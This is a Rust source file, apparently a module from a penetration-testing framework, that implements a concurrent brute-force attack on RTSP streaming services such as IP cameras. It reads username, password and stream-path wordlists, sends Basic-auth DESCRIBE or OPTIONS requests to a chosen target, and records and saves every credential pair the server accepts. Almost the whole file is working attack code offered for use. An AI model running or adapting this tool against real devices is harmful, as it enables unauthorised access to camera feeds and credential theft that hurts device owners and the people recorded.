use anyhow::{anyhow, Result};
use base64::engine::general_purpose::STANDARD as Base64;
use base64::Engine as _;
use std::{
    fs::File,
    io::{BufRead, BufReader, Write},
    net::SocketAddr,
    path::{Path, PathBuf},
    sync::Arc,
};
use tokio::{
    io::{AsyncReadExt, AsyncWriteExt},
    net::TcpStream,
    sync::Mutex,
    time::{sleep, Duration},
};

/// Main entry point for the advanced RTSP brute force module.
pub async fn run(target: &str) -> Result<()> {
    println!("=== Advanced RTSP Brute Force Module ===");
    println!("[*] Target: {}", target);

    let port: u16 = loop {
        let input = prompt_default("RTSP Port", "554")?;
        match input.parse() {
            Ok(p) => break p,
            Err(_) => println!("Invalid port. Try again."),
        }
    };

    let usernames_file = prompt_required("Username wordlist")?;
    let passwords_file = prompt_required("Password wordlist")?;

    let concurrency: usize = loop {
        let input = prompt_default("Max concurrent tasks", "10")?;
        match input.parse() {
            Ok(n) if n > 0 => break n,
            _ => println!("Invalid number. Try again."),
        }
    };

    let stop_on_success = prompt_yes_no("Stop on first success?", true)?;
    let save_results = prompt_yes_no("Save results to file?", true)?;
    let save_path = if save_results {
        Some(prompt_default("Output file", "rtsp_results.txt")?)
    } else {
        None
    };
    let verbose = prompt_yes_no("Verbose mode?", false)?;
    let combo_mode = prompt_yes_no("Combination mode? (try every pass with every user)", false)?;

    let advanced_mode = prompt_yes_no("Use advanced RTSP commands/headers (DESCRIBE + custom headers)?", false)?;
    let mut advanced_headers: Vec<String> = Vec::new();
    let advanced_command = if advanced_mode {
        let method = prompt_default("RTSP method to use (e.g. DESCRIBE)", "DESCRIBE")?;
        if prompt_yes_no("Load extra RTSP headers from a file?", false)? {
            let headers_path = prompt_required("Path to RTSP headers file")?;
            advanced_headers = load_lines(&headers_path)?;
        }
        Some(method)
    } else {
        None
    };

    let brute_force_paths = prompt_yes_no("Brute force possible RTSP paths (e.g. /stream /live)?", false)?;
    let paths = if brute_force_paths {
        let paths_file = prompt_required("Path to RTSP paths file")?;
        load_lines(&paths_file)?
    } else {
        vec!["".to_string()]
    };

    let addr = format!("{}:{}", target, port);
    let found = Arc::new(Mutex::new(Vec::new()));
    let stop = Arc::new(Mutex::new(false));

    println!("\n[*] Starting brute-force on {}", addr);

    let users = load_lines(&usernames_file)?;
    let pass_lines: Vec<_> = BufReader::new(File::open(&passwords_file)?)
        .lines()
        .filter_map(Result::ok)
        .collect();

    let mut idx = 0;
    for pass in pass_lines {
        if *stop.lock().await {
            break;
        }

        let userlist = if combo_mode {
            users.clone()
        } else {
            vec![users.get(idx % users.len()).unwrap_or(&users[0]).to_string()]
        };

        let mut handles = vec![];

        for user in userlist {
            for path in &paths {
                if *stop.lock().await {
                    break;
                }

                let addr = addr.clone();
                let user = user.clone();
                let pass = pass.clone();
                let path = path.clone();
                let found = Arc::clone(&found);
                let stop = Arc::clone(&stop);
                let command = advanced_command.clone();
                let headers = advanced_headers.clone();

                let handle = tokio::spawn(async move {
                    if *stop.lock().await {
                        return;
                    }

                    match try_rtsp_login(&addr, &user, &pass, &path, command.as_deref(), &headers).await {
                        Ok(true) => {
                            let path_str = if path.is_empty() { "NO_PATH" } else { &path };
                            println!("[+] {} -> {}:{} [path={}]", addr, user, pass, path_str);
                            found.lock().await.push((addr.clone(), user.clone(), pass.clone(), path_str.to_string()));
                            if stop_on_success {
                                *stop.lock().await = true;
                            }
                        }
                        Ok(false) => log(verbose, &format!("[-] {} -> {}:{} [path={}]", addr, user, pass, path)),
                        Err(e) => log(verbose, &format!("[!] {} -> error: {}", addr, e)),
                    }

                    sleep(Duration::from_millis(10)).await;
                });

                handles.push(handle);

                if handles.len() >= concurrency {
                    for h in handles.drain(..) {
                        let _ = h.await;
                    }
                }
            }
        }

        for h in handles {
            let _ = h.await;
        }

        idx += 1;
    }

    let creds = found.lock().await;
    if creds.is_empty() {
        println!("\n[-] No credentials found (with these paths).");
    } else {
        println!("\n[+] Valid credentials (and paths):");
        for (host, user, pass, path) in creds.iter() {
            println!("    {} -> {}:{} [path={}]", host, user, pass, path);
        }

        if let Some(path) = save_path {
            let filename = get_filename_in_current_dir(&path);
            let mut file = File::create(&filename)?;
            for (host, user, pass, path) in creds.iter() {
                writeln!(file, "{} -> {}:{} [path={}]", host, user, pass, path)?;
            }
            println!("[+] Results saved to '{}'", filename.display());
        }
    }

    Ok(())
}

/// Resolve a host:port (literal v4/v6 or DNS) into all possible SocketAddrs.
async fn resolve_targets(addr: &str) -> Result<Vec<SocketAddr>> {
    // 1) If it's a literal SocketAddr, return it directly
    if let Ok(sa) = addr.parse::<SocketAddr>() {
        return Ok(vec![sa]);
    }

    // 2) Split into host / port
    let (host, port) = if let Some((h, p)) = addr.rsplit_once(':') {
        (h.to_string(), p.parse().unwrap_or(554))
    } else {
        (addr.to_string(), 554)
    };

    // 3) Clean any nested brackets and format bracketed IPv6 or plain host
    let host_clean = host.trim_matches(|c| c == '[' || c == ']').to_string();
    let host_port = if host_clean.contains(':') {
        format!("[{}]:{}", host_clean, port)
    } else {
        format!("{}:{}", host_clean, port)
    };

    // 4) DNS lookup (handles A + AAAA)
    let addrs = tokio::net::lookup_host(host_port.clone())
        .await
        .map_err(|e| anyhow!("DNS lookup '{}': {}", host_port, e))?
        .collect::<Vec<_>>();

    if addrs.is_empty() {
        Err(anyhow!("No addresses found for '{}'", host_port))
    } else {
        Ok(addrs)
    }
}

/// Attempt RTSP login, trying each resolved address until one succeeds or all fail.
async fn try_rtsp_login(
    addr: &str,
    user: &str,
    pass: &str,
    path: &str,
    method: Option<&str>,
    extra_headers: &[String],
) -> Result<bool> {
    let addrs = resolve_targets(addr).await?;
    let mut last_err = None;
    let mut stream = None;
    let mut connected_sa = None;

    // Try each candidate address
    for sa in addrs {
        match TcpStream::connect(sa).await {
            Ok(s) => {
                stream = Some(s);
                connected_sa = Some(sa);
                break;
            }
            Err(e) => {
                last_err = Some(e);
                continue;
            }
        }
    }

    // Unwrap the successful connection and SocketAddr
    let (mut stream, sa) = match (stream, connected_sa) {
        (Some(s), Some(sa)) => (s, sa),
        _ => {
            return Err(anyhow!(
                "All connection attempts failed: {}",
                last_err.map(|e| e.to_string()).unwrap_or_default()
            ))
        }
    };

    // Build a proper host:port string for the RTSP URI, handling IPv6 correctly
    let ip_str = sa.ip().to_string();
    let host_for_uri = if ip_str.contains(':') {
        format!("[{}]:{}", ip_str, sa.port())
    } else {
        format!("{}:{}", ip_str, sa.port())
    };

    let rtsp_method = method.unwrap_or("OPTIONS");
    let path_str = if path.is_empty() { "" } else { path };
    let credentials = Base64.encode(format!("{}:{}", user, pass));

    let mut request = format!(
        "{method} rtsp://{host}/{path} RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic {auth}\r\n",
        method = rtsp_method,
        host = host_for_uri,
        path = path_str.trim_start_matches('/'),
        auth = credentials,
    );

    for header in extra_headers {
        request.push_str(header);
        if !header.ends_with("\r\n") {
            request.push_str("\r\n");
        }
    }
    request.push_str("\r\n");

    stream.write_all(request.as_bytes()).await?;
    let mut buffer = [0u8; 2048];
    let n = stream.read(&mut buffer).await?;
    if n == 0 {
        return Err(anyhow!("Server closed connection unexpectedly."));
    }
    let response = String::from_utf8_lossy(&buffer[..n]);

    if response.contains("200 OK") {
        Ok(true)
    } else if response.contains("401") || response.contains("403") {
        Ok(false)
    } else {
        Err(anyhow!("Unexpected RTSP response:\n{}", response))
    }
}

// ─── Prompt and utility functions unchanged ───────────────────────────────────

fn prompt_required(msg: &str) -> Result<String> {
    loop {
        print!("{}: ", msg);
        std::io::Write::flush(&mut std::io::stdout())?;
        let mut s = String::new();
        std::io::stdin().read_line(&mut s)?;
        let trimmed = s.trim();
        if !trimmed.is_empty() {
            return Ok(trimmed.to_string());
        }
        println!("This field is required.");
    }
}

fn prompt_default(msg: &str, default: &str) -> Result<String> {
    print!("{} [{}]: ", msg, default);
    std::io::Write::flush(&mut std::io::stdout())?;
    let mut s = String::new();
    std::io::stdin().read_line(&mut s)?;
    let trimmed = s.trim();
    Ok(if trimmed.is_empty() { default.to_string() } else { trimmed.to_string() })
}

fn prompt_yes_no(msg: &str, default_yes: bool) -> Result<bool> {
    let default = if default_yes { "y" } else { "n" };
    loop {
        print!("{} (y/n) [{}]: ", msg, default);
        std::io::Write::flush(&mut std::io::stdout())?;
        let mut s = String::new();
        std::io::stdin().read_line(&mut s)?;
        match s.trim().to_lowercase().as_str() {
            ""        => return Ok(default_yes),
            "y" | "yes" => return Ok(true),
            "n" | "no"  => return Ok(false),
            _ => println!("Invalid input. Please enter 'y' or 'n'."),
        }
    }
}

fn load_lines<P: AsRef<Path>>(path: P) -> Result<Vec<String>> {
    let file = File::open(path)?;
    let reader = BufReader::new(file);
    Ok(reader
        .lines()
        .filter_map(Result::ok)
        .map(|l| l.trim().to_string())
        .filter(|l| !l.is_empty())
        .collect())
}

fn log(verbose: bool, msg: &str) {
    if verbose {
        println!("{}", msg);
    }
}

fn get_filename_in_current_dir(input: &str) -> PathBuf {
    let name = Path::new(input)
        .file_name()
        .unwrap_or_default()
        .to_string_lossy()
        .to_string();
    PathBuf::from(format!("./{}", name))
}
